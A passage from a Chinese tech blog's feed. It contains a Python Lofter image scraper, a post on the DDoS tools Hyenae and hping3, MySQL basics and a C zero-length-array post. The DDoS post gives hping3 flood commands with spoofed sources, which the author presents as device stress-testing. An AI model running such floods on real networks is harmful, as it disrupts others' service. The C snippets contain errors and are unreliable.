title="生成POST请求数据"></a>生成POST请求数据</h3><p>根据前面归档页的分析，我们知道POST请求中除了一些固定参数外，还有用户ID，时间戳<code>timestamp</code>以及单次请求的博客篇数<code>N</code>需要确定，而ID已经在前面已经获取到了；博客篇数可以自定义一个数，如40；最后就剩下时间戳了。</p><p>经过多次尝试发现，这个时间戳<code>timestamp</code>是所有参数中唯一一个需要在每次请求中不断更新的参数。那么它更新的依据是什么呢？每篇博客都对应着一个<code>timestamp</code>，而且是博客的发布时间，每次请求后得到的最后一篇博客的<code>timestamp</code>就可以作为下一次请求的<code>timestamp</code>。为什么呢，因为我多次实验发现，在给定一个<code>timestamp</code>并发送POST请求后，服务器会<strong>以请求参数中的时间戳为起点按时间顺序往前检索出指定篇数(如：40)的博客信息</strong></p><p>响应包的博客信息中包含了每篇博客的时间戳，所以每次获取响应包后，只要解析出响应包中最后一篇博客的时间戳，就可以作为下一次请求中的时间戳。</p><p>根据以上分析，可以写出获取时间戳的函数如下：</p><pre><code class="python"># time_pattern: re.compile(&#39;s%d\.time=(.*);s.*type&#39; % (query_number-1))def _get_timestamp(html, time_pattern):    if not html:        timestamp = round(time.time() * 1000)  # first timestamp(ms)    else:        timestamp = time_pattern.search(html).group(1)    return str(timestamp)</code></pre><blockquote><p>注意，首次请求的时间戳可以直接使用当前系统时间(ms)</p></blockquote><h3 id="发送POST请求包"><a href="#发送POST请求包" class="headerlink" title="发送POST请求包"></a>发送POST请求包</h3><p>POST请求包的<code>url</code>是固定的，<code>data</code>就是前面获取到的所有请求参数，<code>headers</code>如下：</p><pre><code class="python">headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;,        &#39;Host&#39;: username + &#39;.lofter.com&#39;,        &#39;Referer&#39;: &#39;http://%s.lofter.com/view&#39; % username,        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;    &#125;</code></pre><p>其中，<code>User-Agent</code>用于模拟浏览器请求，后面三个参数最好都加上，否则可能无法请求成功。POST请求其实就是一条语句<code>requests.post</code>，具体实现如下：</p><pre><code class="python">def _get_html(url, data, headers):    try:        html = requests.post(url, data, headers = headers)    except Exception as e:        print(&quot;get %s failed\n%s&quot; % (url, str(e)))        return None    finally:        pass    return html</code></pre><h3 id="解析POST响应包"><a href="#解析POST响应包" class="headerlink" title="解析POST响应包"></a>解析POST响应包</h3><p>在获取响应包的文本<code>html</code>后，便可从中获取本次请求得到的所有博客的相对路径，然后生成绝对路径，进而逐一抓取博客原文，从原文中抓取所有图链。</p><pre><code class="python"># get urls of blogs: s3.permalink=&quot;44fbca_19a6b1b&quot;new_blogs = blog_url_pattern.findall(html)num_new_blogs = len(new_blogs)num_blogs += num_new_blogsif num_new_blogs != 0:    print(&#39;NewBlogs:%d\tTotalBolgs:%d&#39; % (num_new_blogs, num_blogs))    # get imgurls from new_blogs    imgurls = []    for blog in new_blogs:        imgurls.extend(_get_imgurls(username, blog, headers))    num_imgs += len(imgurls)</code></pre><p>以上代码便是获取POST的响应包<code>html</code>后的解析操作，其中<code>_get_imurls</code>是用于抓取博客原文并解析出所有图链的函数。</p><pre><code class="python">def _get_imgurls(username, blog, headers):    blog_url = &#39;http://%s.lofter.com/post/%s&#39; % (username, blog)    blog_html = requests.get(blog_url, headers = headers).text    imgurls = re.findall(r&#39;bigimgsrc=&quot;(.*?)&quot;&#39;, blog_html)    print(&#39;Blog\t%s\twith %d\tpictures&#39; % (blog_url, len(imgurls)))    return imgurls</code></pre><h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><pre><code class="python">def _capture_images(imgurl, path):    headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;&#125;    for i in range(1,3):        try:            image_request = requests.get(imgurl, headers = headers, timeout = 20)            if image_request.status_code == 200:                open(path, &#39;wb&#39;).write(image_request.content)                break        except requests.exceptions.ConnectionError as e:            print(&#39;\tGet %s failed\n\terror:%s&#39; % (imgurl, e))            if i == 1:                imgurl = re.sub(&#39;^http://img.*?\.&#39;,&#39;http://img.&#39;,imgurl)                print(&#39;\tRetry &#39; + imgurl)            else:                print(&#39;\tRetry fail&#39;)        except Exception as e:            print(e)        finally:            pass</code></pre><p>有了图链，最后的工作当然是下载图片了，上面这段代码便是用来下载图片的，<code>headers</code>是为了模拟浏览器访问。那为什么要尝试下载两次呢？因为我在抓取过程中，有时候会出现抓取失败的情况，并显示以下错误信息：</p><pre><code class="yaml">&#39;Connection aborted.&#39;, RemoteDisconnected(&#39;Remote end closed connection without response&#39;</code></pre><p>所以在<code>Retry</code>前先将图链对应的<code>host</code>稍加修改,这样可以保证更高的成功率，但并不能完全避免。对于下载失败的情况，可能是：</p><ol><li>被反爬了（极大可能）</li><li>网络通信不畅（可能性低）</li><li>图链失效</li><li>服务器出毛病了</li></ol><p>有时候，同样一个图链，过一段时间去抓就好了，或者换个网络就好了。我猜测是被反爬，但证据不足，所以只能降低爬取频率，比如每发送接收一次POST请求便<code>sleep</code>10s左右，但还是会有失败的情况，如果大家有更好的意见，欢迎交流。目前情况，正常情况100%爬取完全没问题，异常情况90%以上吧。</p><h3 id="主循环"><a href="#主循环" class="headerlink" title="主循环"></a>主循环</h3><p>好了，其它零碎的代码就不多说了，爬虫主循环流程如下，其实就是以上步骤的整合：</p><ol><li>爬取归档页面指定篇数<code>query_number</code>的博文链接<code>new_blogs</code></li><li>逐个爬取博文<code>blog</code>数据，获取每篇<code>blog</code>的所有大图链接<code>imgurls</code></li><li>逐个爬取大图链接<code>imgurls</code>,下载图片至本地目录</li><li>判断是否已爬取完所有博文<ul><li>若已爬完，则显示爬取成果信息，并退出</li><li>若未爬完，则更新请求包中的时间戳<code>timestamp</code>，返回第1步继续爬取新的博文</li></ul></li></ol><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><pre><code class="python">#!/usr/bin/env python# -*- coding:utf-8 -*-# date: 2018.03.07&quot;&quot;&quot;Capture pictures from lofter with username.&quot;&quot;&quot;import reimport osimport platformimport requestsimport timeimport randomdef _get_path(username):    path = &#123;        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/lofter/&#39; + username,        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/lofter/&#39; + username    &#125;.get(platform.system())    if not os.path.isdir(path):        os.makedirs(path)    return pathdef _get_html(url, data, headers):    try:        html = requests.post(url, data, headers = headers)    except Exception as e:        print(&quot;get %s failed\n%s&quot; % (url, str(e)))        return None    finally:        pass    return htmldef _get_blogid(username):    try:        html = requests.get(&#39;http://%s.lofter.com&#39; % username)        id_reg = r&#39;src=&quot;http://www.lofter.com/control\?blogId=(.*)&quot;&#39;        blogid = re.search(id_reg, html.text).group(1)        print(&#39;The blogid of %s is: %s&#39; % (username, blogid))        return blogid    except Exception as e:        print(&#39;get blogid from http://%s.lofter.com failed&#39; % username)        print(&#39;please check your username.&#39;)        exit(1)def _get_timestamp(html, time_pattern):    if not html:        timestamp = round(time.time() * 1000)  # first timestamp(ms)    else:        timestamp = time_pattern.search(html).group(1)    return str(timestamp)def _get_imgurls(username, blog, headers):    blog_url = &#39;http://%s.lofter.com/post/%s&#39; % (username, blog)    blog_html = requests.get(blog_url, headers = headers).text    imgurls = re.findall(r&#39;bigimgsrc=&quot;(.*?)&quot;&#39;, blog_html)    print(&#39;Blog\t%s\twith %d\tpictures&#39; % (blog_url, len(imgurls)))    return imgurlsdef _capture_images(imgurl, path):    headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;&#125;    for i in range(1,3):        try:            image_request = requests.get(imgurl, headers = headers, timeout = 20)            if image_request.status_code == 200:                open(path, &#39;wb&#39;).write(image_request.content)                break        except requests.exceptions.ConnectionError as e:            print(&#39;\tGet %s failed\n\terror:%s&#39; % (imgurl, e))            if i == 1:                imgurl = re.sub(&#39;^http://img.*?\.&#39;,&#39;http://img.&#39;,imgurl)                print(&#39;\tRetry &#39; + imgurl)            else:                print(&#39;\tRetry fail&#39;)        except Exception as e:            print(e)        finally:            passdef _create_query_data(blogid, timestamp, query_number):    data = &#123;&#39;callCount&#39;:&#39;1&#39;,    &#39;scriptSessionId&#39;:&#39;$&#123;scriptSessionId&#125;187&#39;,    &#39;httpSessionId&#39;:&#39;&#39;,    &#39;c0-scriptName&#39;:&#39;ArchiveBean&#39;,    &#39;c0-methodName&#39;:&#39;getArchivePostByTime&#39;,    &#39;c0-id&#39;:&#39;0&#39;,    &#39;c0-param0&#39;:&#39;number:&#39; + blogid,    &#39;c0-param1&#39;:&#39;number:&#39; + timestamp,    &#39;c0-param2&#39;:&#39;number:&#39; + query_number,    &#39;c0-param3&#39;:&#39;boolean:false&#39;,    &#39;batchId&#39;:&#39;123456&#39;&#125;    return datadef main():    # prepare paramters    username = &#39;litreily&#39;    blogid = _get_blogid(username)    query_number = 40    time_pattern = re.compile(&#39;s%d\.time=(.*);s.*type&#39; % (query_number-1))    blog_url_pattern = re.compile(r&#39;s[\d]*\.permalink=&quot;([\w_]*)&quot;&#39;)    # creat path to save imgs    path = _get_path(username)    # parameters of post packet    url = &#39;http://%s.lofter.com/dwr/call/plaincall/ArchiveBean.getArchivePostByTime.dwr&#39; % username    data = _create_query_data(blogid, _get_timestamp(None, time_pattern), str(query_number))    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;,        &#39;Host&#39;: username + &#39;.lofter.com&#39;,        &#39;Referer&#39;: &#39;http://%s.lofter.com/view&#39; % username,        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;    &#125;    num_blogs = 0    num_imgs = 0    index_img = 0    print(&#39;------------------------------- start line ------------------------------&#39;)    while True:        html = _get_html(url, data, headers).text        # get urls of blogs: s3.permalink=&quot;44fbca_19a6b1b&quot;        new_blogs = blog_url_pattern.findall(html)        num_new_blogs = len(new_blogs)        num_blogs += num_new_blogs        if num_new_blogs != 0:            print(&#39;NewBlogs:%d\tTotalBolgs:%d&#39; % (num_new_blogs, num_blogs))            # get imgurls from new_blogs            imgurls = []            for blog in new_blogs:                imgurls.extend(_get_imgurls(username, blog, headers))            num_imgs += len(imgurls)            # download imgs            for imgurl in imgurls:                index_img += 1                paths = &#39;%s/%d.%s&#39; % (path, index_img, re.search(r&#39;(jpg|png|gif)&#39;, imgurl).group(0))                print(&#39;&#123;&#125;\t&#123;&#125;&#39;.format(index_img, paths))                _capture_images(imgurl, paths)        if num_new_blogs != query_number:            print(&#39;------------------------------- stop line -------------------------------&#39;)            print(&#39;capture complete!&#39;)            print(&#39;captured blogs:%d images:%d&#39; % (num_blogs, num_imgs))            print(&#39;download path:&#39; + path)            print(&#39;-------------------------------------------------------------------------&#39;)            break        data[&#39;c0-param1&#39;] = &#39;number:&#39; + _get_timestamp(html, time_pattern)        print(&#39;The next TimeStamp is : %s\n&#39; % data[&#39;c0-param1&#39;].split(&#39;:&#39;)[1])        # wait a few second        time.sleep(random.randint(5,10))if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><p><img src="/assets/spider/lofter/lofter_spider.png" alt="lofter spider"></p><p><img src="/assets/spider/lofter/pictures.png" alt="pictures"></p><h2 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h2><ul><li>Github 源码：<a href="https://github.com/Litreily/capturer">https://github.com/Litreily/capturer</a></li><li>欢迎交流探讨与STAR</li><li>请节制使用！</li></ul>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> spider </tag>
            
            <tag> lofter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两款实用的DDos攻击工具</title>
      <link href="2018/02/22/ddos-attack/"/>
      <url>2018/02/22/ddos-attack/</url>
      
        <content type="html"><![CDATA[<p>之前为了重现某个bug，需要对网络设备进行ddos攻击测试，同时也是对设备的网络攻击防护功能进行抗压测试。临阵磨枪，google了两款攻击工具，windows平台的<code>hyenae</code>，以及Linux平台的<code>hping3</code>，在此记录一下两者的用法。</p><h2 id="Hyenae"><a href="#Hyenae" class="headerlink" title="Hyenae"></a>Hyenae</h2><p><code>hyenae</code>是在<code>Windows</code>平台上非常好用的一款<code>ddos</code>攻击工具，可以完成绝大多数的攻击操作。</p><h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><ul><li><a href="https://sourceforge.net/projects/hyenae/">https://sourceforge.net/projects/hyenae/</a></li></ul><h3 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h3><ul><li>ARP-Request flooding</li><li>ARP-Cache poisoning</li><li>PPPoE session initiation flooding</li><li>Blind PPPoE session termination</li><li>ICMP-Echo flooding</li><li>ICMP-Smurf attack</li><li>ICMP based TCP-Connection reset</li><li>TCP-SYN flooding</li><li>TCP-Land attack</li><li>Blind TCP-Connection reset</li><li>UDP flooding</li><li>DNS-Query flooding</li><li>DHCP-Discover flooding</li><li>DHCP starvation attack</li><li>DHCP-Release forcing</li><li>Cisco HSRP active router hijacking</li><li>Pattern based packet address configuration</li><li>Intelligent address and address protocol detection</li><li>Smart wildcard-based randomization</li><li>Daemon for setting up remote attack networks - HyenaeFE QT-Frontend support</li></ul><h3 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h3><p><img src="/assets/network/hyenae-interface.png" alt="hyenae interface"></p><p><code>hyenae</code>的界面比较简单，图中展示的是<code>SYN/ACK</code>洪泛攻击的配置选项。</p><ul><li><code>operation mode</code>中可以选择网卡</li><li><code>Network Protocol</code>中可以选择攻击方式对应的网络协议，如<code>SYN</code>洪泛攻击对应传输层的<code>TCP</code>，<code>IP</code>协议可选<code>IPv4, IPv6</code></li><li>攻击源的<code>IP</code>,<code>MAC</code>地址以及端口号可以非常灵活的设置，按<code>MAC-IP@port</code>的格式书写，如图中的攻击源匹配模式<code>%-172.17.14.158@80</code><ul><li>% 代表任意，在此处代表任意的MAC地址</li><li>172.17.14.158为伪造的攻击源IP，可以修改为任意的合法IP</li><li>80为端口号，80同时也是网络服务器的默认端口</li></ul></li><li>攻击目标的设置方式与攻击源一致，图中的<code>%-172.17.14.10@80</code><ul><li>% 随机生成MAC地址</li><li>172.17.14.10代表被攻击的IP</li><li>80为攻击目标的被攻击端口号</li></ul></li><li>针对<code>TCP</code>协议，右侧给出其对应的<code>5</code>个常见<code>flags</code>: <code>FIN, SYN, RST, PSH, ACK</code><ul><li>可以随意进行单选或多选，以实现不同的攻击方式</li><li>随意的组合可以产生正常通信过程中无法出现的数据包</li></ul></li><li>软件下方可以设置数据包的发送速率，默认为无限速发送，这会暂用大量带宽，导致网络拥塞；当然啦，这个软件本就是为了攻击网络，导致网络瘫痪正是其目的所在</li><li>选择不同的攻击方式，会显示相应不同的配置选项</li></ul><p>简单说，这幅图的作用是产生<code>MAC</code>地址随机，<code>IP</code>为<code>172.17.14.158</code>，端口为80的伪造源，去攻击目的<code>MAC</code>随机，<code>IP</code>为<code>172.17.14.10</code>的<code>web server</code>。</p><p>由于目的<code>MAC</code>随机，<strong>当MAC地址首字节为奇数时，生成的数据包为广播包</strong>，此时将产生广播风暴，局域网内的所有设备都将收到大量的广播包，当速率很高时，很容易导致局域网瘫痪，这是需要注意的。本人当时年少轻狂，有次测试，使用全速率的广播式<code>SYN/ACK</code>攻击，直接导致部门的局域网瘫痪断网，幸好是晚上，后来找人重置了部门内的网络设备才恢复，想想真是罪过啊。</p><h3 id="Use-cases"><a href="#Use-cases" class="headerlink" title="Use cases"></a>Use cases</h3><ul><li>Land Attack<ul><li>src:  %-172.17.14.94@53</li><li>des: %-172.17.14.94@80</li></ul></li></ul><pre><code class="bash">DoS *** 3118 *** &#123;Land Attack&#125; are suppressed![DoS Attack: Land Attack] from source: 172.17.14.94, port 53,[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,</code></pre><ul><li>SYN/ACK scan (TCP SYN ACK)<ul><li>src: %-172.17.14.8@80</li><li>des: %-172.17.14.94@80</li></ul></li></ul><pre><code class="bash">DoS *** 3896 *** &#123;SYN/ACK Scan&#125; are suppressed![DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,</code></pre><ul><li>ping flood (icmp echo)<ul><li>src:  %-172.17.14.8</li><li>des: %-172.17.14.94</li></ul></li></ul><pre><code class="bash">DoS *** 1881 *** &#123;Ping Flood&#125; are suppressed![DoS Attack: Ping Flood] from source: 172.17.14.8,[DoS Attack: Ping Flood] from source: 172.17.14.8,[DoS Attack: Ping Flood] from source: 172.17.14.8,</code></pre><ul><li>ping sweep (icmp echo)<ul><li>src:  %-%</li><li>des: %-%</li></ul></li></ul><pre><code class="bash">DoS *** 1719 *** &#123;Ping Sweep&#125; are suppressed![DoS Attack: Ping Sweep] from source: 188.167.1.1,[DoS Attack: Ping Sweep] from source: 113.172.1.5,[DoS Attack: Ping Sweep] from source: 175.181.2.6,</code></pre><ul><li>RST Scan(TCP RST)<ul><li>src: %-172.17.14.8@80</li><li>des: %-172.17.14.94@80</li></ul></li></ul><pre><code class="bash">DoS *** 4023 *** &#123;RST Scan&#125; are suppressed![DoS Attack: RST Scan] from source: 172.17.14.8, port 80,[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,</code></pre><ul><li>ACK scan (TCP ACK)<ul><li>src: %-172.17.14.8@80</li><li>des: %-172.17.14.94@80</li></ul></li></ul><pre><code class="bash">DoS *** 3989 *** &#123;ACK Scan&#125; are suppressed![DoS Attack: ACK Scan] from source: 172.17.14.8, port 80,[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80,[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80</code></pre><ul><li>FIN scan(TCP FIN)<ul><li>src: %-172.17.14.8@80</li><li>des: %-172.17.14.94@80</li></ul></li></ul><pre><code class="bash">DoS *** 3009 *** &#123;FIN Scan&#125; are suppressed![DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,</code></pre><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><blockquote><p>hping3是用于生成和解析TCPIP协议数据包的开源工具</p></blockquote><p><code>hping3</code>同样可用于产生<code>ddos</code>攻击包，但与<code>hyenae</code>不同的是，<code>hping3</code>无法手动设置<code>MAC</code>地址，而是根据<code>IP</code>地址自动获取</p><p>需要注意的是，如果使用搬瓦工购买的<code>vps</code>向公网IP执行<code>hping3</code>攻击的话，最好不要尝试，如果要用也一定记得限速，否则就会被警告并关停,当然你有3次机会重置</p><p><img src="/assets/network/vps-warning.png" alt="vps warning"></p><h3 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h3><pre><code class="bash"># land attack$ sudo hping3 -V -c 10000 -d 120 -S -w 64 --keep -p 80 -s 20000 --flood -a 172.17.14.52 172.17.14.52# syn/ack attack$ sudo hping3 -V -c 10000 -d 120 -S -A -w 64 --keep -p 80 -s 80 --flood -a 172.17.14.192 172.17.14.52# -V verbose# -c packet count# -d data size# -p destPort# -s srcPort# -a srcIP# -S SYN tag# -A ACK tag# -w winsize# -I interface</code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><p>网络攻击工具</p><ul><li>hping3<ul><li><a href="http://man.linuxde.net/hping3">http://man.linuxde.net/hping3</a></li><li><a href="http://0daysecurity.com/articles/hping3_examples.html">http://0daysecurity.com/articles/hping3_examples.html</a></li></ul></li><li>LOIC</li><li>hyenae<ul><li><a href="https://sourceforge.net/projects/hyenae/">https://sourceforge.net/projects/hyenae/</a></li></ul></li><li>免费DDOS攻击测试工具大合集 <a href="http://www.freebuf.com/sectool/36545.html">http://www.freebuf.com/sectool/36545.html</a></li></ul></li><li><p>ddos攻击说明</p><ul><li><a href="https://security.radware.com/ddos-knowledge-center/ddospedia/syn-flood/">https://security.radware.com/ddos-knowledge-center/ddospedia/syn-flood/</a></li><li>网络攻击：半连接攻击(SYN攻击)、全连接攻击、RST攻击、IP欺骗、DNS欺骗、DOS/DDOS攻击 <a href="http://blog.csdn.net/guowenyan001/article/details/11777361">http://blog.csdn.net/guowenyan001/article/details/11777361</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ddos </tag>
            
            <tag> hping3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mySQL基本语法</title>
      <link href="2018/02/08/mysql-basic/"/>
      <url>2018/02/08/mysql-basic/</url>
      
        <content type="html"><![CDATA[<p>最近折腾<code>vps</code>，想要手动搭建一个<code>LNMP</code>环境，那必然少不了要补补课，简单学习一下<code>mysql</code>的基本语法。</p><h2 id="install-mySQL"><a href="#install-mySQL" class="headerlink" title="install mySQL"></a>install mySQL</h2><h3 id="install-on-Centos"><a href="#install-on-Centos" class="headerlink" title="install on Centos"></a>install on Centos</h3><pre><code class="bash">$ sudo yum update$ sudo yum install mysql-server mysql-client$ sudo yum install mysql-devel # install sdk of mysql# /usr/include/mysql/mysql.h</code></pre><span id="more"></span><h3 id="install-on-Ubuntu"><a href="#install-on-Ubuntu" class="headerlink" title="install on Ubuntu"></a>install on Ubuntu</h3><pre><code class="bash">sudo apt-get updatesudo apt-get install mysql-server mysql-clientsudo apt-get install libmysqlclient15-dev || sudo apt-get install libmysqlclient-dev</code></pre><h2 id="mySQL-cmd"><a href="#mySQL-cmd" class="headerlink" title="mySQL cmd"></a>mySQL cmd</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><pre><code class="bash">$ mysql -u USERNAME -p$ mysql -u root -pmysql&gt; \h</code></pre><h3 id="add-user"><a href="#add-user" class="headerlink" title="add user"></a>add user</h3><pre><code class="bash">mysql&gt; CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;# e.g.mysql&gt; CREATE USER &#39;test&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;;</code></pre><h3 id="set-password"><a href="#set-password" class="headerlink" title="set password"></a>set password</h3><pre><code class="bash"># 为当前用户设置新的密码mysql&gt; SET PASSWORD = PASSWORD(&quot;newpassword&quot;);# 为其它用户重设密码mysql&gt; SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);</code></pre><h3 id="delete-user"><a href="#delete-user" class="headerlink" title="delete user"></a>delete user</h3><pre><code class="bash">DROP USER &#39;username&#39;@&#39;host&#39;</code></pre><h3 id="grant-privileges"><a href="#grant-privileges" class="headerlink" title="grant privileges"></a>grant privileges</h3><pre><code class="bash"># 为用户授权# privileges: SELECT, INSERT, UPDATE, ALL, ...mysql&gt; GRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39;;# 刷新缓存，使授权生效mysql&gt; FLUSH PRIVILEGES;# e.g.mysql&gt; GRANT SELECT, INSERT ON test.user TO &#39;pig&#39;@&#39;%&#39;;mysql&gt; GRANT ALL ON *.* TO &#39;pig&#39;@&#39;%&#39;;</code></pre><h3 id="databases-and-tables"><a href="#databases-and-tables" class="headerlink" title="databases and tables"></a>databases and tables</h3><ul><li>create database or table</li></ul><pre><code class="bash"># create database: vpsmysql&gt; CREATE DATABASE vps;Query OK, 1 row affected (0.00 sec)# show databasesmysql&gt; SHOW DATABASES;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                || vps                |+--------------------+5 rows in set (0.00 sec)# use databasemysql&gt; USE vps;# create tablemysql&gt; CREATE TABLE test_tbl(    -&gt; test_id INT NOT NULL AUTO_INCREMENT,    -&gt; test_title VARCHAR(100) NOT NULL,    -&gt; test_author VARCHAR(40) NOT NULL,    -&gt; test_date DATE,    -&gt; PRIMARY KEY ( test_id )    -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;Query OK, 0 rows affected (0.06 sec)# show tablesmysql&gt; SHOW TABLES;+---------------+| Tables_in_vps |+---------------+| test_tbl      |+---------------+1 row in set (0.00 sec)# describe tablemysql&gt; DESC test_tbl;+-------------+--------------+------+-----+---------+----------------+| Field       | Type         | Null | Key | Default | Extra          |+-------------+--------------+------+-----+---------+----------------+| test_id     | int(11)      | NO   | PRI | NULL    | auto_increment || test_title  | varchar(100) | NO   |     | NULL    |                || test_author | varchar(40)  | NO   |     | NULL    |                || test_date   | date         | YES  |     | NULL    |                |+-------------+--------------+------+-----+---------+----------------+4 rows in set (0.03 sec)# drop tablemysql&gt; DROP TABLE runoob_tbl;Query OK, 0 rows affected (0.01 sec)</code></pre><p>in conclusion</p><pre><code class="bash">mysql&gt; CREATE DATABESE dataBaseName;mysql&gt; SHOW DATABASES;mysql&gt; USE dataBaseName;mysql&gt; CREATE TABLE tableName(content);mysql&gt; SHOW TABLES;mysql&gt; DESC tableName;mysql&gt; DROP tableName;</code></pre><ul><li>handle tables</li></ul><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="http://www.runoob.com/mysql/mysql-tutorial.html">http://www.runoob.com/mysql/mysql-tutorial.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> mysql </tag>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>结构体中长度为0的字符数组</title>
      <link href="2018/01/02/len0-charArray/"/>
      <url>2018/01/02/len0-charArray/</url>
      
        <content type="html"><![CDATA[<p>在C语言的结构体中，有一种特殊用法，在结构体的末尾放置一个长度为0的字符数组，结构体倒数第二个位置放置一个整型变量<code>len</code>。其典型样例如下：</p><pre><code class="c">typedef struct dynamic_value &#123;  int flag;  int len;  char val[0];&#125;s_flv;</code></pre><p>本文针对其特征，用法及适用场合予以简单介绍。</p><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ul><li>最后的字符数组<code>val</code>长度为0，不占用额外的内存空间</li><li>倒数第二个元素为一整型变量，用于存储字符数组的真实长度</li><li><code>val</code>实际指向的是结构体<code>s_flv</code>之后的内存空间</li><li>字符数组的大小可以在定义结构体变量时动态指定<code>s_flv.len</code></li><li>结构体元素个数不限，样例为典型模式，其中的<code>flag</code>作为标签用以标识不同的数据</li></ul><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ul><li>按<code>s_flv</code>格式写入数据到文件</li></ul><pre><code class="c">#include &lt;stdio.h&gt;static void write_flv(FILE *fp, int flag, char *val)&#123;    int len = 0;    if(val == NULL)        val = &quot;&quot;;    else        len = strlen(val);    fwrite(&amp;flag, sizeof(flag), 1, fp); // 写入标识    fwrite(&amp;len, sizeof(len), 1, fp);   // 写入字符数组长度    fwrite(val, len, 1, fp);    // 写入长度为len的字符串&#125;</code></pre><ul><li>读取文件</li></ul><pre><code class="c">#include &lt;stdio.h&gt;static int read_flv(char *file, char *val)&#123;    char buf[32];   // 假定字符数组长度小等于32    char *p = buf;    FILE *fp = fopen(file, &quot;r&quot;);    if(!fp)        return -1;    if(fread(buf, 2*sizeof(int), 1, fp) &lt;= 0)   // 读取前两个整型数据，获取字符数组长度        return -1;    s_flv *flv = (s_flv *)p;        // 定义s_flv结构体，存储数据    fread(val, flv-&gt;len, 1, fp);    // 读取字符数组    flose(fp);    return 0;&#125;</code></pre><ul><li><strong>说明</strong><ul><li>每执行一次<code>fread</code>或<code>fwrite</code>函数，文件指针就往后偏移相应的读取长度或写入长度</li><li><code>read_flv</code>定义<code>flv</code>时，从<code>buf</code>中可以获取到数组长度，然后使用<code>fread</code>读取相应长度的数据即可取出字符数组的内容。</li><li>使用以上方法生成的文件内容是二进制文件，许多字符是不可打印字符，所以使用<code>cat</code>指令无法正常显示文件内容</li></ul></li></ul><p>上面描述的方法是将<code>s_flv</code>类型的数据存入文件，但如果不想存入文件，那么该如何为其分配内存呢，下面来看一下：</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;// 定义s_flv指针变量int size = 10;s_flv *flv = (s_flv *)malloc(sizeof(s_flv) + size);flv-&gt;len = size;flv-&gt;val = flv + sizeof(s_flv);// 释放指针free(flv);</code></pre><h2 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h2><ul><li><code>json</code>文件的读写</li><li>不定长度字符串的读写</li></ul><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul><li><a href="http://www.cnblogs.com/felove2013/articles/4050226.html">浅析长度为0的数组</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPS+SS翻越GFW</title>
      <link href="2017/09/07/ss-config/"/>
      <url>2017/09/07/ss-config/</url>
      
